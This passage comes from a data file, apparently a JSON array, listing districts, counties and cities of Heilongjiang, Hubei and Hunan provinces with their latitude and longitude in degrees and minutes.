"43", "126", "41"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5357\u5C97\u533A", "45", "46", "126", "41"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9053\u91CC\u533A", "45", "46", "126", "37"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9053\u5916\u533A", "45", "47", "126", "39"], ["\u9ED1\u9F99\u6C5F\u7701", "\u677E\u5317\u533A", "45", "48", "126", "33"], ["\u9ED1\u9F99\u6C5F\u7701", "\u547C\u5170\u533A", "45", "54", "126", "35"], ["\u9ED1\u9F99\u6C5F\u7701", "\u963F\u57CE\u533A", "45", "33", "126", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8304\u5B50\u6CB3\u533A", "45", "46", "131", "4"], ["\u9ED1\u9F99\u6C5F\u7701", "\u65B0\u5174\u533A", "45", "48", "130", "50"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6843\u5C71\u533A", "45", "46", "130", "58"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5E26\u5CAD\u533A", "47", "1", "129", "1"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5357\u5C94\u533A", "47", "8", "129", "17"], ["\u9ED1\u9F99\u6C5F\u7701", "\u91D1\u5C71\u5C6F\u533A", "47", "25", "129", "26"], ["\u9ED1\u9F99\u6C5F\u7701", "\u897F\u6797\u533A", "47", "29", "129", "17"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7F8E\u6EAA\u533A", "47", "38", "129", "8"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E4C\u9A6C\u6CB3\u533A", "47", "43", "128", "47"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7FE0\u5CE6\u533A", "47", "43", "128", "39"], ["\u9ED1\u9F99\u6C5F\u7701", "\u53CB\u597D\u533A", "47", "51", "128", "49"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E0A\u7518\u5CAD\u533A", "47", "58", "129", "1"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E94\u8425\u533A", "48", "7", "129", "15"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EA2\u661F\u533A", "48", "14", "129", "23"], ["\u9ED1\u9F99\u6C5F\u7701", "\u65B0\u9752\u533A", "48", "17", "129", "32"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6C64\u65FA\u6CB3\u533A", "48", "27", "129", "34"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E4C\u4F0A\u5CAD\u533A", "48", "36", "129", "25"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5174\u5B89\u533A", "47", "16", "130", "13"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5174\u5C71\u533A", "47", "22", "130", "18"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5DE5\u519C\u533A", "47", "19", "130", "15"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5357\u5C71\u533A", "47", "18", "130", "17"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5411\u9633\u533A", "47", "20", "130", "17"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E1C\u5C71\u533A", "47", "20", "130", "19"], ["\u9ED1\u9F99\u6C5F\u7701", "\u524D\u8FDB\u533A", "46", "49", "130", "22"], ["\u9ED1\u9F99\u6C5F\u7701", "\u90CA\u533A", "46", "48", "130", "19"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5411\u9633\u533A", "46", "48", "130", "20"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E1C\u98CE\u533A", "46", "49", "130", "24"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5B9D\u5C71\u533A", "46", "34", "131", "24"], ["\u9ED1\u9F99\u6C5F\u7701", "\u56DB\u65B9\u53F0\u533A", "46", "35", "131", "20"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5CAD\u4E1C\u533A", "46", "34", "131", "8"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5C16\u5C71\u533A", "46", "38", "131", "10"], ["\u9ED1\u9F99\u6C5F\u7701", "\u57CE\u5B50\u6CB3\u533A", "45", "20", "131", "0"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9E21\u51A0\u533A", "45", "18", "130", "58"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6052\u5C71\u533A", "45", "12", "130", "56"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6EF4\u9053\u533A", "45", "22", "130", "47"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9EBB\u5C71\u533A", "45", "12", "130", "31"], ["\u9ED1\u9F99\u6C5F\u7701", "\u68A8\u6811\u533A", "45", "5", "130", "41"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7231\u6C11\u533A", "44", "35", "129", "35"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E1C\u5B89\u533A", "44", "35", "129", "37"], ["\u9ED1\u9F99\u6C5F\u7701", "\u897F\u5B89\u533A", "44", "34", "129", "37"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9633\u660E\u533A", "44", "36", "129", "38"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5B89\u8FBE\u5E02", "46", "24", "125", "20"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8BB7\u6CB3\u5E02", "48", "29", "124", "52"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E94\u5927\u8FDE\u6C60\u5E02", "48", "31", "126", "12"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5317\u5B89\u5E02", "48", "14", "126", "31"], ["\u9ED1\u9F99\u6C5F\u7701", "\u53CC\u57CE\u5E02", "45", "22", "126", "19"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8087\u4E1C\u5E02", "46", "4", "125", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E94\u5E38\u5E02", "44", "55", "127", "9"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5C1A\u5FD7\u5E02", "45", "13", "127", "57"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6D77\u6797\u5E02", "44", "34", "129", "23"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5B81\u5B89\u5E02", "44", "21", "129", "28"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7A46\u68F1\u5E02", "44", "55", "130", "31"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EE5\u82AC\u6CB3\u5E02", "44", "25", "131", "9"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5BC6\u5C71\u5E02", "45", "33", "131", "52"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5BCC\u9526\u5E02", "47", "15", "132", "2"], ["\u9ED1\u9F99\u6C5F\u7701", "\u94C1\u529B\u5E02", "46", "59", "128", "1"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6D77\u4F26\u5E02", "47", "28", "126", "58"], ["\u9ED1\u9F99\u6C5F\u7701", "\u540C\u6C5F\u5E02", "47", "39", "132", "31"], ["\u9ED1\u9F99\u6C5F\u7701", "\u864E\u6797\u5E02", "45", "46", "132", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7518\u5357\u53BF", "47", "55", "123", "30"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9F99\u6C5F\u53BF", "47", "20", "123", "11"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6CF0\u6765\u53BF", "46", "24", "123", "25"], ["\u9ED1\u9F99\u6C5F\u7701", "\u675C\u5C14\u4F2F\u7279\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "46", "52", "124", "27"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6797\u7538\u53BF", "47", "11", "124", "52"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5BCC\u88D5\u53BF", "47", "49", "124", "28"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4F9D\u5B89\u53BF", "47", "53", "125", "18"], ["\u9ED1\u9F99\u6C5F\u7701", "\u514B\u5C71\u53BF", "48", "2", "125", "52"], ["\u9ED1\u9F99\u6C5F\u7701", "\u514B\u4E1C\u53BF", "48", "2", "126", "15"], ["\u9ED1\u9F99\u6C5F\u7701", "\u62DC\u6CC9\u53BF", "47", "36", "126", "5"], ["\u9ED1\u9F99\u6C5F\u7701", "\u671B\u594E\u53BF", "46", "50", "126", "29"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9752\u5188\u53BF", "46", "41", "126", "6"], ["\u9ED1\u9F99\u6C5F\u7701", "\u660E\u6C34\u53BF", "47", "11", "125", "54"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5170\u897F\u53BF", "46", "16", "126", "17"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8087\u5DDE\u53BF", "45", "42", "125", "16"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8087\u6E90\u53BF", "45", "31", "125", "5"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5DF4\u5F66\u53BF", "46", "5", "127", "24"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5BBE\u53BF", "45", "45", "127", "29"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6728\u5170\u53BF", "45", "57", "128", "2"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5EF6\u5BFF\u53BF", "45", "27", "128", "20"], ["\u9ED1\u9F99\u6C5F\u7701", "\u901A\u6CB3\u53BF", "45", "58", "128", "45"], ["\u9ED1\u9F99\u6C5F\u7701", "\u65B9\u6B63\u53BF", "45", "50", "128", "50"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E1C\u5B81\u53BF", "44", "4", "131", "7"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9E21\u4E1C\u53BF", "45", "15", "131", "8"], ["\u9ED1\u9F99\u6C5F\u7701", "\u52C3\u5229\u53BF", "45", "45", "130", "34"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6797\u53E3\u53BF", "45", "18", "130", "16"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6C64\u539F\u53BF", "46", "44", "129", "54"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6866\u5DDD\u53BF", "47", "1", "130", "43"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6866\u5357\u53BF", "46", "14", "130", "34"], ["\u9ED1\u9F99\u6C5F\u7701", "\u96C6\u8D24\u53BF", "46", "43", "131", "8"], ["\u9ED1\u9F99\u6C5F\u7701", "\u53CB\u8C0A\u53BF", "46", "47", "131", "48"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5B9D\u6E05\u53BF", "46", "19", "132", "12"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EE5\u6EE8\u53BF", "47", "17", "131", "51"], ["\u9ED1\u9F99\u6C5F\u7701", "\u841D\u5317\u53BF", "47", "35", "130", "50"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5609\u836B\u53BF", "48", "53", "130", "23"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4F9D\u5170\u53BF", "46", "19", "129", "33"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5E86\u5B89\u53BF", "46", "53", "127", "31"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EE5\u68F1\u53BF", "47", "15", "127", "6"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5B59\u5434\u53BF", "49", "25", "127", "19"], ["\u9ED1\u9F99\u6C5F\u7701", "\u900A\u514B\u53BF", "49", "35", "128", "28"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5854\u6CB3\u53BF", "52", "19", "124", "42"], ["\u9ED1\u9F99\u6C5F\u7701", "\u547C\u739B\u53BF", "51", "44", "126", "39"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6F20\u6CB3\u53BF", "52", "58", "122", "32"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9976\u6CB3\u53BF", "46", "48", "134", "1"], ["\u9ED1\u9F99\u6C5F\u7701", "\u629A\u8FDC\u53BF", "48", "22", "134", "17"], ["\u6E56\u5317\u7701", "\u6B66\u6C49\u5E02", "30", "36", "114", "18"], ["\u6E56\u5317\u7701", "\u6069\u65BD\u571F\u5BB6\u65CF\u82D7\u65CF\u81EA\u6CBB\u5DDE", "30", "18", "109", "28"], ["\u6E56\u5317\u7701", "\u8346\u5DDE\u5E02", "30", "20", "112", "14"], ["\u6E56\u5317\u7701", "\u5B5D\u611F\u5E02", "30", "56", "113", "55"], ["\u6E56\u5317\u7701", "\u968F\u5DDE\u5E02", "31", "43", "113", "22"], ["\u6E56\u5317\u7701", "\u8346\u95E8\u5E02", "31", "2", "112", "12"], ["\u6E56\u5317\u7701", "\u5B9C\u660C\u5E02", "30", "42", "111", "17"], ["\u6E56\u5317\u7701", "\u8944\u6A0A\u5E02", "32", "1", "112", "9"], ["\u6E56\u5317\u7701", "\u5341\u5830\u5E02", "32", "39", "110", "47"], ["\u6E56\u5317\u7701", "\u9EC4\u77F3\u5E02", "30", "12", "115", "2"], ["\u6E56\u5317\u7701", "\u9102\u5DDE\u5E02", "30", "24", "114", "53"], ["\u6E56\u5317\u7701", "\u9EC4\u5188\u5E02", "30", "27", "114", "52"], ["\u6E56\u5317\u7701", "\u54B8\u5B81\u5E02", "29", "51", "114", "19"], ["\u6E56\u5317\u7701", "\u54B8\u5B89\u533A", "29", "52", "114", "18"], ["\u6E56\u5317\u7701", "\u6881\u5B50\u6E56\u533A", "30", "5", "114", "40"], ["\u6E56\u5317\u7701", "\u9102\u57CE\u533A", "30", "24", "114", "53"], ["\u6E56\u5317\u7701", "\u4E0B\u9646\u533A", "30", "11", "114", "58"], ["\u6E56\u5317\u7701", "\u94C1\u5C71\u533A", "30", "12", "114", "54"], ["\u6E56\u5317\u7701", "\u897F\u585E\u5C71\u533A", "30", "12", "115", "7"], ["\u6E56\u5317\u7701", "\u9EC4\u77F3\u6E2F\u533A", "30", "14", "115", "4"], ["\u6E56\u5317\u7701", "\u9EC4\u5DDE\u533A", "30", "26", "114", "53"], ["\u6E56\u5317\u7701", "\u5B5D\u5357\u533A", "30", "55", "113", "55"], ["\u6E56\u5317\u7701", "\u65B0\u6D32\u533A", "30", "51", "114", "48"], ["\u6E56\u5317\u7701", "\u9EC4\u9642\u533A", "30", "52", "114", "22"], ["\u6E56\u5317\u7701", "\u534E\u5BB9\u533A", "30", "32", "114", "44"], ["\u6E56\u5317\u7701", "\u6C5F\u590F\u533A", "30", "21", "114", "19"], ["\u6E56\u5317\u7701", "\u6C49\u5357\u533A", "30", "19", "114", "5"], ["\u6E56\u5317\u7701", "\u8521\u7538\u533A", "30", "35", "114", "2"], ["\u6E56\u5317\u7701", "\u4E1C\u897F\u6E56\u533A", "30", "37", "114", "8"], ["\u6E56\u5317\u7701", "\u6D2A\u5C71\u533A", "30", "30", "114", "20"], ["\u6E56\u5317\u7701", "\u785A\u53E3\u533A", "30", "34", "114", "16"], ["\u6E56\u5317\u7701", "\u6B66\u660C\u533A", "30", "34", "114", "18"], ["\u6E56\u5317\u7701", "\u6C49\u9633\u533A", "30", "33", "114", "16"], ["\u6E56\u5317\u7701", "\u6C5F\u6C49\u533A", "30", "36", "114", "16"], ["\u6E56\u5317\u7701", "\u6C5F\u5CB8\u533A", "30", "36", "114", "18"], ["\u6E56\u5317\u7701", "\u9752\u5C71\u533A", "30", "38", "114", "23"], ["\u6E56\u5317\u7701", "\u8305\u7BAD\u533A", "32", "36", "110", "49"], ["\u6E56\u5317\u7701", "\u5F20\u6E7E\u533A", "32", "39", "110", "47"], ["\u6E56\u5317\u7701", "\u8944\u9633\u533A", "32", "5", "112", "12"], ["\u6E56\u5317\u7701", "\u8944\u57CE\u533A", "32", "1", "112", "9"], ["\u6E56\u5317\u7701", "\u6A0A\u57CE\u533A", "32", "2", "112", "8"], ["\u6E56\u5317\u7701", "\u6387\u5200\u533A", "30", "59", "112", "12"], ["\u6E56\u5317\u7701", "\u4E1C\u5B9D\u533A", "31", "3", "112", "12"], ["\u6E56\u5317\u7701", "\u8346\u5DDE\u533A", "30", "21", "112", "11"], ["\u6E56\u5317\u7701", "\u66FE\u90FD\u533A", "31", "43", "113", "22"], ["\u6E56\u5317\u7701", "\u6C99\u5E02\u533A", "30", "19", "112", "15"], ["\u6E56\u5317\u7701", "\u5937\u9675\u533A", "30", "46", "111", "19"], ["\u6E56\u5317\u7701", "\u897F\u9675\u533A", "30", "42", "111", "16"], ["\u6E56\u5317\u7701", "\u70B9\u519B\u533A", "30", "42", "111", "16"], ["\u6E56\u5317\u7701", "\u4F0D\u5BB6\u5C97\u533A", "30", "39", "111", "21"], ["\u6E56\u5317\u7701", "\u7307\u4EAD\u533A", "30", "32", "111", "25"], ["\u6E56\u5317\u7701", "\u6069\u65BD\u5E02", "30", "18", "109", "28"], ["\u6E56\u5317\u7701", "\u5229\u5DDD\u5E02", "30", "18", "108", "56"], ["\u6E56\u5317\u7701", "\u5B9C\u90FD\u5E02", "30", "24", "111", "27"], ["\u6E56\u5317\u7701", "\u679D\u6C5F\u5E02", "30", "26", "111", "46"], ["\u6E56\u5317\u7701", "\u677E\u6ECB\u5E02", "30", "11", "111", "46"], ["\u6E56\u5317\u7701", "\u77F3\u9996\u5E02", "29", "44", "112", "24"], ["\u6E56\u5317\u7701", "\u6D2A\u6E56\u5E02", "29", "48", "113", "27"], ["\u6E56\u5317\u7701", "\u8D64\u58C1\u5E02", "29", "43", "113", "53"], ["\u6E56\u5317\u7701", "\u4ED9\u6843\u5E02", "30", "22", "113", "27"], ["\u6E56\u5317\u7701", "\u6F5C\u6C5F\u5E02", "30", "25", "112", "53"], ["\u6E56\u5317\u7701", "\u5929\u95E8\u5E02", "30", "40", "113", "10"], ["\u6E56\u5317\u7701", "\u6C49\u5DDD\u5E02", "30", "39", "113", "50"], ["\u6E56\u5317\u7701", "\u5E94\u57CE\u5E02", "30", "57", "113", "34"], ["\u6E56\u5317\u7701", "\u5B89\u9646\u5E02", "31", "16", "113", "41"], ["\u6E56\u5317\u7701", "\u5E7F\u6C34\u5E02", "31", "37", "113", "49"], ["\u6E56\u5317\u7701", "\u5B9C\u57CE\u5E02", "31", "43", "112", "15"], ["\u6E56\u5317\u7701", "\u949F\u7965\u5E02", "31", "10", "112", "35"], ["\u6E56\u5317\u7701", "\u5F53\u9633\u5E02", "30", "49", "111", "47"], ["\u6E56\u5317\u7701", "\u4E39\u6C5F\u53E3\u5E02", "32", "33", "111", "31"], ["\u6E56\u5317\u7701", "\u8001\u6CB3\u53E3\u5E02", "32", "23", "111", "40"], ["\u6E56\u5317\u7701", "\u67A3\u9633\u5E02", "32", "8", "112", "45"], ["\u6E56\u5317\u7701", "\u9EBB\u57CE\u5E02", "31", "11", "115", "2"], ["\u6E56\u5317\u7701", "\u5927\u51B6\u5E02", "30", "6", "114", "58"], ["\u6E56\u5317\u7701", "\u6B66\u7A74\u5E02", "29", "51", "115", "33"], ["\u6E56\u5317\u7701", "\u54B8\u4E30\u53BF", "29", "41", "109", "9"], ["\u6E56\u5317\u7701", "\u6765\u51E4\u53BF", "29", "31", "109", "24"], ["\u6E56\u5317\u7701", "\u5BA3\u6069\u53BF", "29", "59", "109", "29"], ["\u6E56\u5317\u7701", "\u5EFA\u59CB\u53BF", "30", "36", "109", "44"], ["\u6E56\u5317\u7701", "\u5174\u5C71\u53BF", "31", "21", "110", "45"], ["\u6E56\u5317\u7701", "\u795E\u519C\u67B6\u6797\u533A", "31", "45", "110", "40"], ["\u6E56\u5317\u7701", "\u5DF4\u4E1C\u53BF", "31", "3", "110", "20"], ["\u6E56\u5317\u7701", "\u79ED\u5F52\u53BF", "30", "50", "110", "59"], ["\u6E56\u5317\u7701", "\u4E94\u5CF0\u571F\u5BB6\u65CF\u81EA\u6CBB\u53BF", "30", "12", "110", "40"], ["\u6E56\u5317\u7701", "\u9E64\u5CF0\u53BF", "29", "54", "110", "2"], ["\u6E56\u5317\u7701", "\u957F\u9633\u571F\u5BB6\u65CF\u81EA\u6CBB\u53BF", "30", "28", "111", "11"], ["\u6E56\u5317\u7701", "\u516C\u5B89\u53BF", "30", "4", "112", "14"], ["\u6E56\u5317\u7701", "\u6C5F\u9675\u53BF", "30", "2", "112", "25"], ["\u6E56\u5317\u7701", "\u901A\u57CE\u53BF", "29", "15", "113", "49"], ["\u6E56\u5317\u7701", "\u5609\u9C7C\u53BF", "29", "59", "113", "54"], ["\u6E56\u5317\u7701", "\u76D1\u5229\u53BF", "29", "49", "112", "53"], ["\u6E56\u5317\u7701", "\u6C99\u6D0B\u53BF", "30", "42", "112", "35"], ["\u6E56\u5317\u7701", "\u4EAC\u5C71\u53BF", "31", "1", "113", "6"], ["\u6E56\u5317\u7701", "\u4E91\u68A6\u53BF", "31", "1", "113", "45"], ["\u6E56\u5317\u7701", "\u5B5D\u660C\u53BF", "31", "15", "113", "58"], ["\u6E56\u5317\u7701", "\u8FDC\u5B89\u53BF", "31", "4", "111", "38"], ["\u6E56\u5317\u7701", "\u5357\u6F33\u53BF", "31", "47", "111", "50"], ["\u6E56\u5317\u7701", "\u4FDD\u5EB7\u53BF", "31", "53", "111", "15"], ["\u6E56\u5317\u7701", "\u8C37\u57CE\u53BF", "32", "16", "111", "39"], ["\u6E56\u5317\u7701", "\u90E7\u53BF", "32", "50", "110", "49"], ["\u6E56\u5317\u7701", "\u623F\u53BF", "32", "4", "110", "44"], ["\u6E56\u5317\u7701", "\u7AF9\u5C71\u53BF", "32", "14", "110", "14"], ["\u6E56\u5317\u7701", "\u7AF9\u6EAA\u53BF", "32", "19", "109", "43"], ["\u6E56\u5317\u7701", "\u90E7\u897F\u53BF", "32", "60", "110", "25"], ["\u6E56\u5317\u7701", "\u82F1\u5C71\u53BF", "30", "45", "115", "40"], ["\u6E56\u5317\u7701", "\u7EA2\u5B89\u53BF", "31", "17", "114", "37"], ["\u6E56\u5317\u7701", "\u5927\u609F\u53BF", "31", "34", "114", "7"], ["\u6E56\u5317\u7701", "\u56E2\u98CE\u53BF", "30", "38", "114", "52"], ["\u6E56\u5317\u7701", "\u7F57\u7530\u53BF", "30", "47", "115", "24"], ["\u6E56\u5317\u7701", "\u6D60\u6C34\u53BF", "30", "27", "115", "16"], ["\u6E56\u5317\u7701", "\u9633\u65B0\u53BF", "29", "51", "115", "12"], ["\u6E56\u5317\u7701", "\u901A\u5C71\u53BF", "29", "36", "114", "31"], ["\u6E56\u5317\u7701", "\u5D07\u9633\u53BF", "29", "33", "114", "2"], ["\u6E56\u5317\u7701", "\u8572\u6625\u53BF", "30", "14", "115", "26"], ["\u6E56\u5317\u7701", "\u9EC4\u6885\u53BF", "30", "5", "115", "56"], ["\u6E56\u5317\u7701", "\u5BBF\u677E\u53BF", "30", "9", "116", "7"], ["\u6E56\u5357\u7701", "\u957F\u6C99\u5E02", "28", "14", "112", "56"], ["\u6E56\u5357\u7701", "\u6C38\u5DDE\u5E02", "26", "26", "111", "37"], ["\u6E56\u5357\u7701", "\u90B5\u9633\u5E02", "27", "15", "111", "28"], ["\u6E56\u5357\u7701", "\u6000\u5316\u5E02", "27", "34", "109", "60"], ["\u6E56\u5357\u7701", "\u6E58\u897F\u571F\u5BB6\u65CF\u82D7\u65CF\u81EA\u6CBB\u5DDE", "28", "19", "109", "44"], ["\u6E56\u5357\u7701", "\u5F20\u5BB6\u754C\u5E02", "29", "8", "110", "28"], ["\u6E56\u5357\u7701", "\u5A04\u5E95\u5E02", "27", "44", "112", "0"], ["\u6E56\u5357\u7701", "\u6E58\u6F6D\u5E02", "27", "50", "112", "56"], ["\u6E56\u5357\u7701", "\u76CA\u9633\u5E02", "28", "36", "112", "19"], ["\u6E56\u5357\u7701", "\u5E38\u5FB7\u5E02", "29", "3", "111", "41"], ["\u6E56\u5357\u7701", "\u5CB3\u9633\u5E02", "29", "22", "113", "7"], ["\u6E56\u5357\u7701", "\u682A\u6D32\u5E02", "27", "50", "113", "8"], ["\u6E56\u5357\u7701", "\u8861\u9633\u5E02", "26", "54", "112", "34"], ["\u6E56\u5357\u7701", "\u90F4\u5DDE\u5E02", "25", "47", "113", "1"], ["\u6E56\u5357\u7701", "\u5929\u5FC3\u533A", "28", "7", "112", "59"], ["\u6E56\u5357\u7701", "\u96E8\u82B1\u533A", "28", "8", "113", "2"], ["\u6E56\u5357\u7701", "\u8299\u84C9\u533A", "28", "11", "113", "2"], ["\u6E56\u5357\u7701", "\u5F00\u798F\u533A", "28", "15", "112", "59"], ["\u6E56\u5357\u7701", "\u5CB3\u9E93\u533A", "28", "14", "112", "56"], ["\u6E56\u5357\u7701", "\u96E8\u6E56\u533A", "27", "52", "112", "54"], ["\u6E56\u5357\u7701", "\u5CB3\u5858\u533A", "27", "52", "112", "57"], ["\u6E56\u5357\u7701", "\u82A6\u6DDE\u533A", "27", "50", "113", "9"], ["\u6E56\u5357\u7701", "\u8377\u5858\u533A", "27", "52", "113", "10"], ["\u6E56\u5357\u7701", "\u77F3\u5CF0\u533A", "27", "52", "113", "6"], ["\u6E56\u5357\u7701", "\u5929\u5143\u533A", "27", "50", "113", "7"], ["\u6E56\u5357\u7701", "\u5357\u5CB3\u533A", "27", "15", "112", "44"], ["\u6E56\u5357\u7701", "\u84B8\u6E58\u533A", "26", "54", "112", "36"], ["\u6E56\u5357\u7701", "\u96C1\u5CF0\u533A", "26", "53", "112", "36"], ["\u6E56\u5357\u7701", "\u77F3\u9F13\u533A", "26", "54", "112", "36"], ["\u6E56\u5357\u7701", "\u73E0\u6656\u533A", "26", "54", "112", "37"], ["\u6E56\u5357\u7701", "\u5317\u6E56\u533A", "25", "48", "113", "1"], ["\u6E56\u5357\u7701", "\u82CF\u4ED9\u533A", "25", "48", "113", "2"], ["\u6E56\u5357\u7701", "\u96F6\u9675\u533A", "26", "14", "111", "37"], ["\u6E56\u5357\u7701", "\u51B7\u6C34\u6EE9\u533A", "26", "26", "111", "36"], ["\u6E56\u5357\u7701", "\u53CC\u6E05\u533A", "27", "14", "111", "28"], ["\u6E56\u5357\u7701", "\u5927\u7965\u533A", "27", "14", "111", "27"], ["\u6E56\u5357\u7701", "\u5317\u5854\u533A", "27", "15", "111", "27"], ["\u6E56\u5357\u7701", "\u5A04\u661F\u533A", "27", "44", "111", "60"], ["\u6E56\u5357\u7701", "\u9E64\u57CE\u533A", "27", "33", "109", "57"], ["\u6E56\u5357\u7701", "\u6C38\u5B9A\u533A", "29", "8", "110", "29"], ["\u6E56\u5357\u7701", "\u6B66\u9675\u6E90\u533A", "29", "21", "110", "32"], ["\u6E56\u5357\u7701", "\u6B66\u9675\u533A", "29", "2", "111", "41"], ["\u6E56\u5357\u7701", "\u9F0E\u57CE\u533A", "29", "1", "111", "41"], ["\u6E56\u5357\u7701", "\u8D44\u9633\u533A", "28", "36", "112", "19"], ["\u6E56\u5357\u7701", "\u8D6B\u5C71\u533A", "28", "36", "112", "22"], ["\u6E56\u5357\u7701", "\u5CB3\u9633\u697C\u533A", "29", "22", "113", "6"], ["\u6E56\u5357\u7701", "\u541B\u5C71\u533A", "29", "26", "112", "60"], ["\u6E56\u5357\u7701", "\u4E91\u6EAA\u533A", "29", "28", "113", "18"], ["\u6E56\u5357\u7701", "\u6B66\u5188\u5E02", "26", "44", "110", "38"], ["\u6E56\u5357\u7701", "\u6D2A\u6C5F\u5E02", "27", "12", "109", "49"], ["\u6E56\u5357\u7701", "\u5409\u9996\u5E02", "28", "19", "109", "44"], ["\u6E56\u5357\u7701", "\u6D9F\u6E90\u5E02", "27", "42", "111", "40"], ["\u6E56\u5357\u7701", "\u51B7\u6C34\u6C5F\u5E02", "27", "41", "111", "26"], ["\u6E56\u5357\u7701", "\u6E58\u4E61\u5E02", "27", "44", "112", "32"], ["\u6E56\u5357\u7701", "\u97F6\u5C71\u5E02", "27", "56", "112", "31"], ["\u6E56\u5357\u7701", "\u6C68\u7F57\u5E02", "28", "48", "113", "5"], ["\u6E56\u5357\u7701", "\u6C85\u6C5F\u5E02", "28", "51", "112", "23"], ["\u6E56\u5357\u7701", "\u6D25\u5E02\u5E02", "29", "37", "111", "53"], ["\u6E56\u5357\u7701", "\u4E34\u6E58\u5E02", "29", "29", "113", "28"], ["\u6E56\u5357\u7701", "\u6D4F\u9633\u5E02", "28", "9", "113", "38"], ["\u6E56\u5357\u7701", "\u91B4\u9675\u5E02", "27", "40", "113", "29"], ["\u6E56\u5357\u7701", "\u5E38\u5B81\u5E02", "26", "25", "112", "23"], ["\u6E56\u5357\u7701", "\u8012\u9633\u5E02", "26", "25", "112", "51"], ["\u6E56\u5357\u7701", "\u8D44\u5174\u5E02", "25", "59", "113", "14"], ["\u6E56\u5357\u7701", "\u6C5F\u534E\u7476\u65CF\u81EA\u6CBB\u53BF", "25", "11", "111", "35"], ["\u6E56\u5357\u7701", "\u6C5F\u6C38\u53BF", "25", "17", "111", "20"], ["\u6E56\u5357\u7701", "\u9053\u53BF", "25", "32", "111", "35"], ["\u6E56\u5357\u7701", "\u53CC\u724C\u53BF", "25", "58", "111", "39"], ["\u6E56\u5357\u7701", "\u57CE\u6B65\u82D7\u65CF\u81EA\u6CBB\u53BF", "26", "22", "110", "19"], ["\u6E56\u5357\u7701", "\u65B0\u5B81\u53BF", "26", "26", "110", "51"], ["\u6E56\u5357\u7701", "\u4E1C\u5B89\u53BF", "26", "24", "111", "17"], ["\u6E56\u5357\u7701", "\u9686\u56DE\u53BF", "27", "7", "111", "2"], ["\u6E56\u5357\u7701", "\u90B5\u9633\u53BF", "26", "60", "111", "16"], ["\u6E56\u5357\u7701", "\u65B0\u90B5\u53BF", "27", "19", "111", "27"], ["\u6E56\u5357\u7701", "\u6D1E\u53E3\u53BF", "27", "3", "110", "34"], ["\u6E56\u5357\u7701", "\u4E2D\u65B9\u53BF", "27", "24", "109", "56"], ["\u6E56\u5357\u7701", "\u82B7\u6C5F\u4F97\u65CF\u81EA\u6CBB\u53BF", "27", "27", "109", "41"], ["\u6E56\u5357\u7701", 